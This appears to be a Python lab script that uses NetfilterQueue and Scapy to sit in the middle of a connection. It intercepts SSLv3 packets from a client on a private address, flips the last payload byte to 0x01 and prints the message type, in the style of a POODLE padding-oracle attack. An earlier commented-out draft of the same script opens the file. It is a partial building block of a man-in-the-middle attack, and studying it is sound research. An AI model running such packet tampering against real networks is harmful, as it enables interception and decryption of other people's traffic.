#from netfilterqueue import NetfilterQueue
#from scapy.all import IP, TCP
#from scapy.all import *
#from utils.is_sslv3_packet import is_sslv3_packet
#from utils.set_modified_payload_to_packet import set_modified_payload_to_packet
#
#
#def attack_callback(packet):
#    pkt = IP(packet.get_payload())
#
#    packet.accept()
#
#try:
#    nfqueue = NetfilterQueue()
#    nfqueue.bind(0, attack_callback)
#    nfqueue.run()
#except KeyboardInterrupt:
#    pass
#
#nfqueue.unbind()
#

from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP
from scapy.all import *
from utils.is_sslv3_packet import is_sslv3_packet
from utils.set_modified_payload_to_packet import set_modified_payload_to_packet
from utils.extract_ssl_message_type import extract_ssl_message_type
from scapy.layers.inet import IP,TCP



def attack_callback(packet):
    pkt = IP(packet.get_payload())

    # SSLv3パケットかつ、送信元がclientの場合
    if is_sslv3_packet(pkt) and pkt.src == "192.168.0.10":

        payload = pkt[TCP].payload

        if len(payload) > 0:
            modified_payload = bytes(payload)[:-1] + b'\x01' # 下位1バイトを変更
            #modified_payload = bytes(payload)[:-1] + bytes(payload)[-1:] # 下位1バイトを変更
            #modified_payload = payload.copy()


            modified_pkt = pkt.copy()
            modified_pkt[TCP].payload = Raw(modified_payload)

            set_modified_payload_to_packet(packet, modified_pkt)
            message_type = extract_ssl_message_type(modified_payload)
            print(message_type)
            hexdump(packet.get_payload())
    packet.accept()


try:
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, attack_callback)
    nfqueue.run()
except KeyboardInterrupt:
    pass

nfqueue.unbind()
